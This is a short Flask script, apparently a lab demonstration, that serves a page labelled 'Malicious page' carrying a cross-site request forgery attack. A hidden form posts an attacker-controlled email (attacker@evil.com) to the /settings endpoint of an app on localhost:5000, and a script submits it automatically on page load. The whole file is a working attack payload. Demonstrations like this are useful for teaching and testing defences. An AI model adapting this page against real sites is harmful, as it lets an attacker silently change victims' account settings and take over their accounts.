from flask import Flask, render_template_string

app = Flask(__name__)

CSRF_PAGE = """
<!doctype html>
<html>
  <body>
    <h3>Malicious page</h3>

    <form id="csrf" action="http://localhost:5000/settings" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
      // auto-submit as soon as page loads
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(CSRF_PAGE)

if __name__ == "__main__":
    app.run(port=5001)

